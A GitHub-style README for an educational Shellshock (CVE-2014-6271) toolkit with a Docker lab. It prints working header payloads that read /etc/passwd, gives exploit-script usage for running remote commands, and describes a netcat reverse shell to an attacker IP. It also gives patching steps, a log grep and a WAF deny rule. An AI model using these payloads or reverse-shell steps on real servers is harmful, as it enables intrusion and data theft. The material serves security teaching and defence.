# Bash Apocalypse

**Automated exploitation toolkit for CVE-2014-6271 (Shellshock)**

[![Severity](https://img.shields.io/badge/Severity-CRITICAL-red)](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
[![CVSS Score](https://img.shields.io/badge/CVSS-10.0-critical)](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

A complete security research project demonstrating the Shellshock vulnerability that affected millions of servers in 2014. Includes automated scanning, exploitation capabilities, and defensive recommendations.

![Demo](demo.gif)

---

## What is Shellshock?

Shellshock (CVE-2014-6271) is a critical vulnerability in the Bash shell that allows remote code execution through environment variable manipulation. Discovered in 2014 after existing for 22 years, it affected millions of Unix/Linux systems worldwide.

**How it works:**
```bash
# Normal: Bash exports functions as environment variables
my_function='() { echo "hello"; }'

# The bug: Bash continues parsing after the function definition
exploit='() { :;}; echo "PWNED"'  # The second command executes
```

Web servers using CGI pass HTTP headers as environment variables to Bash, making them vulnerable:
```http
User-Agent: () { :;}; echo; /bin/bash -c 'cat /etc/passwd'
```

---

## Quick Start

```bash
# Clone and setup
git clone https://github.com/YOUR-USERNAME/bash-apocalypse.git
cd bash-apocalypse

# Start vulnerable lab
docker-compose up -d

# Run exploit
chmod +x exploit.sh
./exploit.sh --url http://localhost:8080/cgi-bin/test.cgi --cmd "whoami"
```

---

## Features

**Automated Scanner**
- Discovers vulnerable CGI endpoints
- Tests multiple injection points (User-Agent, Referer, Cookie)
- Custom wordlist support

**Exploitation Tool**
- Command execution with output capture
- Automated reverse shell
- Multiple payload options

**Lab Environment**
- One-command Docker setup
- Isolated vulnerable server
- Safe testing environment

---

## Usage

### Scan for vulnerabilities
```bash
./exploit.sh --scan --target localhost --port 8080
```

### Execute commands
```bash
./exploit.sh --url http://target/cgi-bin/test.cgi --cmd "id"
```

### Get reverse shell
```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
./exploit.sh --url http://target/cgi-bin/test.cgi --reverse-shell YOUR_IP:4444
```

---

## Manual Exploitation (Burp Suite)

### Step 1: Intercept Request
![Burp Intercept](screenshots/burp-intercept.png)

### Step 2: Inject Payload
![Exploitation](screenshots/exploitation.png)

Modify the User-Agent header:
```http
User-Agent: () { :;}; echo; /bin/bash -c 'cat /etc/passwd'
```

### Step 3: Observe Response
![Reverse Shell](screenshots/reverse-shell.png)

The server executes your command and returns the output.

---

## Technical Analysis

### Attack Flow
```
Client (Attacker)
    │
    │ HTTP Request with malicious User-Agent
    ▼
Web Server
    │
    │ Passes header as environment variable
    ▼
CGI Script
    │
    │ Spawns Bash process
    ▼
Bash Shell
    │
    │ Parses function + executes trailing commands
    ▼
Command Execution (RCE)
```

### Root Cause
When Bash encounters a function definition in an environment variable:
1. It parses the function: `() { :;}`
2. **Bug:** It continues parsing and executes anything after
3. Result: Arbitrary command execution

---

## Defense

### Immediate Mitigation
```bash
# Update Bash
sudo apt-get update && sudo apt-get upgrade bash

# Disable CGI if not needed
sudo a2dismod cgi && sudo systemctl restart apache2
```

### Detection
```bash
# Check logs for exploitation attempts
grep -E "\\(\\)|\\{.*\\}" /var/log/apache2/access.log
```

### WAF Rule
```apache
SecRule REQUEST_HEADERS "\\(\\).*\\{" "deny,status:403,msg:'Shellshock Attack'"
```

---

## Skills Demonstrated

- Web application penetration testing
- Bash scripting and automation
- HTTP protocol manipulation
- Docker containerization
- Burp Suite proficiency
- Both offensive and defensive security

---

## Project Structure

```
bash-apocalypse/
├── README.md
├── exploit.sh              # Main tool
├── payloads.txt            # Test payloads
├── docker-compose.yml      # Lab setup
├── demo.gif
└── screenshots/
    ├── burp-intercept.png
    ├── exploitation.png
    └── reverse-shell.png
```

---

## Legal Disclaimer

**Educational purposes only.** Only test systems you own or have explicit permission to test. Unauthorized access is illegal.

---

## Resources

- [CVE-2014-6271 Details](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [Cloudflare: Inside Shellshock](https://blog.cloudflare.com/inside-shellshock/)
- [Practice: HackTheBox - Shocker](https://www.hackthebox.eu/)

---

## Author

**[Your Name]**

Security researcher focused on offensive security and vulnerability research.

- GitHub: [@your-username](https://github.com/your-username)
- LinkedIn: [linkedin.com/in/yourprofile](https://linkedin.com/in/yourprofile)
- Email: your.email@example.com


MIT License - see [LICENSE](LICENSE) for details.

---

*Built to understand how vulnerabilities work and how to defend against them.* hjnhjfj
